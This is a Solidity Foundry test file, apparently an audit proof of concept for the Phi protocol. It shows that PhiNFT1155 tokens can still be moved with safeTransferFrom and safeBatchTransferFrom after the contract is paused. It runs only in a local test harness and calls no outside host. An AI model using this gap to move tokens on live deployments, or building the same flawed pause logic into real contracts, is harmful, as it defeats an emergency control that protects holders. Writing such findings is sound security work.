// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.25;

import { PRBTest } from "@prb/test/src/PRBTest.sol";
import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

import { IERC1155 } from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import { IPhiFactory } from "../../src/interfaces/IPhiFactory.sol";

import { PhiFactory } from "../../src/PhiFactory.sol";
import { PhiRewards } from "../../src/reward/PhiRewards.sol";
import { PhiNFT1155 } from "../../src/art/PhiNFT1155.sol";
import { LibString } from "solady/utils/LibString.sol";
import { ECDSA } from "solady/utils/ECDSA.sol";

import { Settings } from "../helpers/Settings.sol";

contract ExploitTest is Settings {
    string ART_ID_URL_STRING;

    using LibString for *;

    uint256 expiresIn;

    function setUp() public override {
        super.setUp();

        ART_ID_URL_STRING = "333L2H5BLDwyojZtOi-7TSCqFM7ISlsDOIlAfTUs5es";
        expiresIn = START_TIME + 1 days;

        vm.warp(START_TIME + 1);

        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(artCreator);
        _createSigArt();
    }

    function _createCred(string memory credType, string memory verificationType, bytes32 merkleRoot) internal {
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;

        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        vm.stopPrank();
    }

    function _createSigArt() internal {
        bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
        bytes memory signCreateData = abi.encode(expiresIn, ART_ID_URL_STRING, credData);
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        IPhiFactory.CreateConfig memory config =
            IPhiFactory.CreateConfig(participant, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
        phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config);
    }

    function _createSigSignData() internal view returns (bytes memory) {
        uint256 artId = 1;
        uint256 tokenId = 1;
        uint256 quantity = 1;
        bytes32 claimData = bytes32("1");

        bytes memory signData =
            abi.encode(expiresIn, participant, participant, verifier, artId, block.chainid, claimData);
        bytes32 msgHash = keccak256(signData);
        bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
        if (v != 27) s = s | bytes32(uint256(1) << 255);
        bytes memory data = abi.encode(
            r, s, participant, verifier, participant, tokenId, quantity, expiresIn, "ART_ID_URL_STRING", claimData
        );
        return data;
    }

    /// @notice Test demonstrating the pausing vulnerability
    /// @dev This test shows that even when the PhiNFT1155 contract is paused,
    ///      users can still transfer NFTs, which should not be possible.
    function test_pauseVulnerability_nftTransfersWorkWhenPaused() public {
        uint256 artId = 1;
        address payable artAddress = payable(phiFactory.getArtAddress(artId));

        // First, mint an NFT to participant
        vm.warp(START_TIME + 2);
        bytes memory data = _createSigSignData();
        bytes memory payload = abi.encodePacked(abi.encodeWithSignature("signatureClaim()"), data);

        vm.startPrank(participant, participant);
        (bool success,) = artAddress.call{ value: phiFactory.getArtMintFee(artId, 1) }(payload);
        require(success, "1155 artAddress.call failed");

        // Verify the participant received the NFT
        assertEq(IERC1155(artAddress).balanceOf(participant, 1), 1, "Participant should have 1 NFT");

        // Get the PhiNFT1155 contract instance
        PhiNFT1155 phiNFT = PhiNFT1155(artAddress);

        // Pause the contract as PhiFactory (who is the actual owner of PhiNFT1155)
        vm.startPrank(address(phiFactory));
        phiNFT.pause();

        // Verify the contract is paused
        assertTrue(phiNFT.paused(), "Contract should be paused");
        vm.stopPrank();

        // VULNERABILITY: Even though the contract is paused,
        // we can still transfer NFTs using safeTransferFrom
        // This should not be possible if pause was properly implemented

        // Set up approval for transfer
        vm.startPrank(participant);
        phiNFT.setApprovalForAll(anyone, true);
        vm.stopPrank();

        // Attempt to transfer while paused - this should fail but doesn't
        vm.startPrank(anyone);
        phiNFT.safeTransferFrom(participant, anyone, 1, 1, "");
        vm.stopPrank();

        // Verify the transfer succeeded (vulnerability demonstrated)
        assertEq(IERC1155(artAddress).balanceOf(participant, 1), 0, "Participant should have 0 NFT after transfer");
        assertEq(IERC1155(artAddress).balanceOf(anyone, 1), 1, "Anyone should have 1 NFT after transfer");

        console2.log("VULNERABILITY CONFIRMED: NFT transfer succeeded even though contract is paused!");

        // Test batch transfer as well
        // Transfer back to participant to test batch transfer
        vm.startPrank(anyone);
        phiNFT.setApprovalForAll(participant, true);
        vm.stopPrank();

        // Attempt batch transfer while paused - this should also fail but doesn't
        vm.startPrank(participant);
        uint256[] memory tokenIds = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        tokenIds[0] = 1;
        amounts[0] = 1;
        phiNFT.safeBatchTransferFrom(anyone, participant, tokenIds, amounts, "");
        vm.stopPrank();

        // Verify the batch transfer succeeded (vulnerability demonstrated)
        assertEq(IERC1155(artAddress).balanceOf(participant, 1), 1, "Participant should have 1 NFT after batch transfer");
        assertEq(IERC1155(artAddress).balanceOf(anyone, 1), 0, "Anyone should have 0 NFT after batch transfer");

        console2.log("VULNERABILITY CONFIRMED: Batch NFT transfer succeeded even though contract is paused!");
    }

    /// @notice Test showing that pause mechanism is functional
    /// @dev This test demonstrates that the pause state can be set and read correctly
    function test_pauseMechanism_basicFunctionality() public {
        uint256 artId = 1;
        address payable artAddress = payable(phiFactory.getArtAddress(artId));
        PhiNFT1155 phiNFT = PhiNFT1155(artAddress);

        // Verify contract starts unpaused
        assertFalse(phiNFT.paused(), "Contract should start unpaused");

        // Pause the contract as PhiFactory (who is the actual owner of PhiNFT1155)
        vm.startPrank(address(phiFactory));
        phiNFT.pause();
        assertTrue(phiNFT.paused(), "Contract should be paused");

        // Unpause the contract
        phiNFT.unPause();
        assertFalse(phiNFT.paused(), "Contract should be unpaused again");

        console2.log("EXPECTED: Pause mechanism works correctly for state changes");
    }
}